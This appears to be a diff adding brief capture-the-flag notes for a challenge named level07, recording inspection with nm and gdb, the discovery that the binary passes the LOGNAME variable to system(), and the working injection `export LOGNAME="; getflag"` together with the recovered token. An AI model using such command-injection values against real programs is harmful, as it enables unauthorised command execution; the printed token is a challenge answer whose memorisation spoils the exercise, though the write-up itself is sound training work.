@@ -1,0 +1,17 @@
+Notes:
+nm
+nm -u
+gdb
+
+functions found: 'getenv', 'system' 
+binary prints out username: "level07"
+so we figured that LOGNAME env var was fetched somehow by envp or getenv
+
+tried few things to inject code
+ended up with something simpler than our first attempts and it works!!
+
+flag:
+    `export LOGNAME="; getflag"`
+
+token:
+    `fiumuikeil55xe9cu4dood66h`
